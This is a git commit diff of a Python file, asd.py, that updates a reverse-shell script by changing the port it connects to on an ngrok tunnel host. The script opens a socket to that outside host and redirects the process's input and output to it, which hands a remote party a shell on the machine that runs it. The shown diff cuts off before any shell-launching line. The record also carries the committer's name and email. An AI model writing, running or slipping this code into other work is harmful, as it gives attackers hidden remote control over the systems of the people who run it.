7fe4cc20e1492d9aa2f4081d6728462db112c4f3
pahan12 <pahan.ranjit0201@gmail.com>
2019-01-23 20:14:01 +0530

    Update asd.py

--- asd.py
+++ asd.py
@@ -1,6 +1,6 @@
 import socket,subprocess,os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("0.tcp.ngrok.io",12892));
+s.connect(("0.tcp.ngrok.io",10086));
 os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
